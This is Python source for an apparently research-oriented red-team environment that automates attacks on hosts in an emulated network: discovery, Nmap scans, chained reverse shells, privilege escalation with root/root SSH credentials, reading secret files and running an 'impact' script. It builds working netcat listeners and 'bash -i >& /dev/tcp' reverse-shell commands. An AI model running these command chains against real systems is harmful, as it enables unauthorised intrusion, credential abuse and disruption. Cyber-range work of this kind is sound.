
import base64
import ipaddress
import networkx as nx
from aco_emulator import ACOEmulator
import re
import matplotlib.pyplot as plt
import shlex

class RedTeamEnv:
    def __init__(self, topo: ACOEmulator):
        self.topo = topo
        self.topo.build(interactive=False)
        self.net = topo.net
        self.red_agent_node = self.net.get('user0')
        self.observations = {
            'user0': {
                'IP Address': [ipaddress.IPv4Address(self.red_agent_node.IP())], 
                'Subnet': [ipaddress.IPv4Network(self.red_agent_node.IP() + '/24', strict=False)],
                'Open Ports': [{'port': 22, 'protocol': 'tcp', 'service': 'ssh'}],
                'Access': 'root',
            }
        }
        self.reverse_shells = {}  # (src, dst) -> port
        self.host_available_ports = {
            "user0": 4444,
        }  # host -> available ports
        
        # Track nodes with root access
        self.root_access_nodes = {'user0'}

        # Reachability graph with node metadata
        self.graph = nx.DiGraph()
        self.graph.add_node('user0', ip=[ipaddress.IPv4Address('10.0.0.1')], access='root', open_ports=[22])

        # Map: hostname -> ipaddress.IPv4Address
        self.host_ip_map = {
                    h.name: [ipaddress.IPv4Address(h.IP(intf=intf)) for intf in h.intfList()] for h in self.net.hosts
                }

    def get_observation(self):
        """Return a dict with current view of reachable nodes."""
        return self.observations

    def discover_remote_systems(self, subnet: str):
        """Run discover_remote.sh from a node in the given subnet with root access."""
        script_path = "/home/hacker/red_scripts/discover_remote.sh"
        try:
            subnet = ipaddress.IPv4Network(subnet, strict=False)
        except ValueError as e:
            print(f"[!] Invalid subnet: {subnet} — {e}")
            return

        selected_node = None
        for node in self.root_access_nodes:
            node_ip = self.host_ip_map.get(node)
            
            if node_ip:
                node_ip = node_ip[0]          
                
            if node_ip and node_ip in subnet:
                selected_node = node
                break

        if not selected_node:
            print(f"[!] No root-access node found in subnet {subnet}")
            return

        print(f"[*] {selected_node} executing discovery on subnet {subnet}")

        subnet_prefix = str(subnet.network_address).rsplit('.', 1)[0]
        output = self.execute_command_on(selected_node, f"bash {script_path} {subnet_prefix}").strip()

        for line in output.splitlines():
            if "Host up:" in line:
                discovered_ip_str = line.split()[-1]
                discovered_ip = ipaddress.IPv4Address(discovered_ip_str)
                target_host = self._resolve_ip_to_host(discovered_ip)
                if target_host and target_host not in self.graph.nodes:
                    self.graph.add_node(target_host, ip=[discovered_ip], access='unknown')
                    self.graph.add_edge(selected_node, target_host, type='discovery')
                    
                    self.observations[target_host] = {
                        'IP Address': [discovered_ip],
                        'Subnet': [ipaddress.IPv4Network(discovered_ip_str + '/24', strict=False)],
                        'Open Ports': [],
                        'Access': 'unknown',
                    }
                    
                    print(f"[+] Discovered: {target_host} ({discovered_ip})")        
                    
                elif target_host and target_host in self.graph.nodes:
                    # Update existing node with new IP
                    existing_ip = self.graph.nodes[target_host]['ip']
                    if discovered_ip not in existing_ip:
                        self.graph.nodes[target_host]['ip'].append(discovered_ip)
                        self.observations[target_host]['IP Address'].append(discovered_ip)
                        self.observations[target_host]['Subnet'].append(ipaddress.IPv4Network(discovered_ip_str + '/24', strict=False))
                        # print(f"[+] Updated {target_host} with new IP: {discovered_ip}")
                    
                    if selected_node != target_host and not self.graph.has_edge(selected_node, target_host):
                        self.graph.add_edge(selected_node, target_host, type='discovery')
    
    def discover_network(self, target_ip: str):
        """Run service discovery (Nmap) on the target IP from a reachable root-access node."""
        script_path = "/home/hacker/red_scripts/discover_network.sh"
        
        source_node = None
        for node in self.root_access_nodes:
            if self._is_reachable(node, target_ip):
                source_node = node
                break

        if not source_node:
            print(f"[!] No root-access node can reach {target_ip}")
            return

        print(f"[*] {source_node} executing service discovery on {target_ip}")
        output = self.execute_command_on(source_node, f"bash {script_path} {target_ip}").strip()
        
        print(f"[>] Nmap output:\n{output}")
        print("-" * 80)
        # Parse Nmap output for open ports
        services = []
        for line in output.splitlines():
            match = re.match(r'^(\d+)/(tcp|udp)\s+open\s+(\S+)?', line)
            if match != None:
                port = int(match.group(1))
                protocol = match.group(2)
                service = match.group(3) if match.lastindex >= 3 else None
                
                # add if not already in list
                if len(services) == 0 or not any(s['port'] == port for s in services):
                # Add service to the list
                    services.append({
                        "port": port,
                        "protocol": protocol,
                        "service": service
                    })

        if services:
            # Add/update graph node for target IP
            host = self._resolve_ip_to_host(ipaddress.IPv4Address(target_ip))
            ip_address = target_ip
            
            if host:
                if host not in self.graph.nodes:
                    self.graph.add_node(host, ip=str(ip_address), access="unknown")
                    
                self.observations[host]['Open Ports'] = services

                # Update graph observation
                self.graph.nodes[host].update({'Open Ports': services})

                print(f"[+] Added services for {host}: {[s['port'] for s in services]}")
        else:
            print(f"[!] Host {target_ip} has no open ports.")
            
    def plot_graph(self):
        """Plot the current reachability graph with node labels and colors."""
        pos = nx.spring_layout(self.graph, seed=42)

        # Node colors: green = root, gray = unknown
        node_colors = []
        for _, attr in self.graph.nodes(data=True):
            
            if attr.get('impact'):
                node_colors.append('red')
            elif attr.get('access') == 'root':
                node_colors.append('orange')
            elif attr.get('access') == 'user':
                node_colors.append('yellow')
            else:
                node_colors.append('lightgray')
                
        # Edge colors: red = reverse shell, gray = discovery
        edge_colors = []
        for _, _, attr in self.graph.edges(data=True):
            if attr.get('type') == 'reverse_shell':
                edge_colors.append('black')
            elif attr.get('type') == 'discovery':
                edge_colors.append('gray')
            else:
                edge_colors.append('black')

        # Node labels: include IP, access level and service info
        def get_service_info_str(open_ports):
            if open_ports:
                return "\n".join([f"{service['port']}/{service['protocol']} ({service['service']})" for service in open_ports])
            else:
                return ""
        
        labels = {
            node: f"{node}\n{data['ip']}\n({data['access']})\n{get_service_info_str(data.get('Open Ports', []))}"
            for node, data in self.graph.nodes(data=True)
        }

        plt.figure(figsize=(10, 6))
        nx.draw(self.graph, pos, with_labels=True, labels=labels, 
                node_color=node_colors, node_size=2500, font_size=8, edge_color=edge_colors, width=2)
        plt.title("Red Team Reachability Graph")
        plt.tight_layout()
        plt.show()
        
    def _resolve_ip_to_host(self, ip: ipaddress.IPv4Address):
        for host, host_ip in self.host_ip_map.items():
            if ip in host_ip:
                return host
        return None

    def _is_reachable(self, node, target_ip: str):
        """
        Returns True if the target host is reachable from node
        in the current reachability graph.
        """
        target_host = self._resolve_ip_to_host(ipaddress.IPv4Address(target_ip))
        
        if self.graph.has_edge(node, target_host):
            return True
        return False

    def execute_command_on(self, target_node, command):
        """Send a command from user0 to a reachable target node via reverse shell chain."""
        relay_cmd = self._relay_command("user0", target_node, command)
        if relay_cmd:
            print(f"[>] Sending relayed command to {target_node}:\n{relay_cmd}")
            result = self.net.get("user0").cmd(relay_cmd).strip()
            print(f"[<] Command result: {result}")
            return result
        else:
            print("[!] Command not sent — path unreachable.")

    def _relay_command(self, source, target, final_command):
        """Construct a command relayed through the reverse shell chain."""
        try:
            path = nx.shortest_path(self.graph, source=source, target=target)
        except nx.NetworkXNoPath:
            print(f"[!] No path from {source} to {target}")
            return None

        cmd = final_command
        
        print(f"\n\n[*] Relaying command from {source} to {target} via path: {path}\n")
        
        if len(path) == 1:
            return cmd
                
        for i in range(len(path) - 1, 0, -1):
            attacker = path[i-1]
            victim = path[i]
            edge_data = self.graph[attacker][victim]
            port = edge_data.get("port")
            
            if not port:
                raise ValueError(f"[!] No port found for edge {attacker} → {victim}")
            
            # encoded = base64.b64encode(cmd.encode()).decode()
            
            sleep_time = 22 if 'network' in cmd else 3
            cmd = shlex.quote(cmd)
            empty_cmd = shlex.quote("")
            
            cmd = f"echo {empty_cmd} > /home/hacker/output_{port}.txt ; echo {cmd} > /home/hacker/fifo_{port}; sleep {sleep_time}; cat /home/hacker/output_{port}.txt | strings "
            # cmd = f"echo \"\" > /home/hacker/output_{port}.txt ; echo \"{encoded}\" | base64 -d > /home/hacker/fifo_{port}; sleep {sleep_time}; cat /home/hacker/output_{port}.txt | strings "
        return cmd
        
    def drop_reverse_shell(self, from_host: str, to_host: str, username: str, password: str):
        """
        Establish a reliable reverse shell from `from_host` to `to_host` using FIFO pipes and relayed commands.
        Sets up a persistent command relay using tail + while loop and netcat.
        """
        attacker_ip = self.host_ip_map[from_host]
        target_ip = self.host_ip_map[to_host]
        
        if not attacker_ip or not target_ip:
            print(f"[!] Cannot Drop reverse shell between {from_host} and {to_host}.")
            
        if len(target_ip) > 1 or len(attacker_ip) > 1:
            print(f"[!] Cannot Drop reverse shell between {from_host} and {to_host}.")
            return
        
        # convert to string
        target_ip = str(target_ip[0])
        attacker_ip = str(attacker_ip[0])
        
        revshell_port = self.host_available_ports.get(from_host)

        in_file = f"/home/hacker/input_{revshell_port}.txt"
        out_file = f"/home/hacker/output_{revshell_port}.txt"
        fifo_file = f"/home/hacker/fifo_{revshell_port}"

        # Step 1: Setup persistent command relay on `to_host`
        setup_cmds = [
            f"rm -f {in_file} {out_file} {fifo_file}",
            f"mkfifo {fifo_file}",
            f"touch {in_file} {out_file}",

            # This process sets up reverse shell listener piping output into fifo
            f"bash -c \"tail -f {fifo_file} | nc -lnvp {revshell_port} | tee {out_file} &\"",
        ]

        full_setup_cmd = " && ".join(setup_cmds)
        print(f"[*] Setting up persistent FIFO reverse shell listener on {to_host}")
        result = self.execute_command_on(from_host, full_setup_cmd).strip()
        print(f"[<] Setup command result: {result}")

        # Step 2: Connect from `to_host` back to listener on `from_host`
        revshell_cmd = (
            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout=5 {username}@{target_ip} "
            f"\"bash -i >& /dev/tcp/{attacker_ip}/{revshell_port} 0>&1\" &"
        )
        
        print(f"[*] Dropping reverse shell from {to_host} to {from_host}:{revshell_port}")
        result = self.execute_command_on(from_host, command=revshell_cmd).strip()

        # Step 3: Register reverse shell path
        shell_type = "root" if username == "root" else "user"
        self.register_reverse_shell(from_host, to_host, revshell_port, shell_type)

    def register_reverse_shell(self, attacker: str, target: str, port: int, access_level: str):
        """Add reverse shell edge and metadata to graph."""
        self.reverse_shells[(attacker, target)] = port
        if self.graph.has_edge(attacker, target):
            self.graph[attacker][target].update(port=port, type="reverse_shell")
        else:
            self.graph.add_edge(attacker, target, port=port, type="reverse_shell")
            
        self.observations[target]['Access'] = access_level
        self.graph.nodes[target]['access'] = access_level
        
        if access_level == 'root':
            self.root_access_nodes.add(target)
        
        self.host_available_ports[attacker] = port + 1
        old_port = self.host_available_ports.get(target)
        if old_port == None:
            self.host_available_ports[target] = 4444
        
        print(f"[+] Reverse shell established: {attacker} → {target} via port {port}")
        
    def delete_reverse_shell(self, from_host: str, to_host: str):
        """
        Cleans up a previously established reverse shell between from_host and to_host.
        1. Kills background processes (nc, tail, cat) on to_host via from_host.
        2. Removes FIFO, input, and output buffer files on to_host.
        3. Unregisters the reverse shell from internal tracking.
        """
        revshell_port = self.reverse_shells.get((from_host, to_host), {})
        if not revshell_port:
            print(f"[!] No reverse shell found between {from_host} and {to_host}.")
            return

        in_file = f"/home/hacker/input_{revshell_port}.txt"
        out_file = f"/home/hacker/output_{revshell_port}.txt"
        fifo_file = f"/home/hacker/fifo_{revshell_port}"


        cleanup_cmd = f"""
        pids=$(ps aux | grep -E '{in_file}|{fifo_file}|nc|tail' | grep -v grep | awk '{{print $2}}') ;
        for pid in $pids; do kill -9 $pid ; done ;
        rm -f {in_file} {out_file} {fifo_file} ;
        """

        full_cleanup_cmd = cleanup_cmd

        print(f"[*] Cleaning up reverse shell from {from_host} to {to_host}")
        result = self.execute_command_on(from_host, full_cleanup_cmd).strip()

        # Unregister from tracking
        self.unregister_reverse_shell(from_host, to_host)
    
    def unregister_reverse_shell(self, from_host: str, to_host: str):
        """Remove reverse shell edge and metadata from graph."""
        if (from_host, to_host) in self.reverse_shells:
            del self.reverse_shells[(from_host, to_host)]
            self.graph[from_host][to_host].update(port=None, type=None)
            print(f"[+] Reverse shell removed: {from_host} → {to_host}")
        else:
            print(f"[!] No reverse shell found between {from_host} and {to_host}.")
        
        # Update available ports
        # if from_host in self.host_available_ports:
        #     self.host_available_ports[from_host] -= 1
            
        self.observations[to_host]['Access'] = 'unknown'
        self.graph.nodes[to_host]['access'] = 'unknown'
        
        if to_host in self.root_access_nodes:
            self.root_access_nodes.remove(to_host)
        
    def privilege_escalate(self, target):
        source_node = None
        target_ip = self.host_ip_map.get(target)
        if not target_ip or len(target_ip) != 1:
            raise ValueError(f"[!] Cannot privilege escalate for {target}")
        
        for node in self.root_access_nodes:
            if self._is_reachable(node, target_ip[0]):
                source_node = node
                break
            
        if not source_node:
            raise ValueError(f"[!] No root-access node can reach {target}")
        
        print(f"[*] {source_node} executing privilege escalation on {target}")
        
        self.drop_reverse_shell(source_node, target, 'root', 'root')
        
        discover_cmd = f"cat /home/hacker/secret.txt"
        result = self.execute_command_on(target, discover_cmd).strip()  
        
        for line in result.splitlines():
            match = re.match(r'^\s*([^=\s]+)\s*=\s*([^=\s]+)\s*$', line)
            if match:
                key = match.group(1)
                value = match.group(2)
                
                # Update the graph with the new host
                if key not in self.graph.nodes:
                    self.graph.add_node(key, ip=[ipaddress.IPv4Address(value)], access='unknown')
                    self.graph.add_edge(target, key, type='discovery')
                    
                    self.observations[key] = {
                        'IP Address': [ipaddress.IPv4Address(value)],
                        'Subnet': [ipaddress.IPv4Network(value + '/24', strict=False)],
                        'Open Ports': [],
                        'Access': 'unknown',
                    }
                    
                    print(f"[+] Discovered: {key} ({value})")

    def impact(self, target: str):
        """Run impact.sh from a node in the given subnet with root access."""
        script_path = "/home/hacker/red_scripts/impact.sh"
        try:
            target_ip = self.host_ip_map.get(target)
            if not target_ip or len(target_ip) != 1:
                raise ValueError(f"Cannot privilege escalate for {target}")
        except ValueError as e:
            print(f"[!] Error — {e}")
            return

        print(f"[*] Executing impact on target {target}")

        output = self.execute_command_on(target, f"bash {script_path}").strip()
        
        if "disrupted" in output:
            print(f"[+] Impact executed successfully on {target}")
            
            self.observations[target]['impact'] = True
            self.graph.nodes[target]['impact'] = True
            
        else:
            print(f"[!] Impact execution failed on {target}")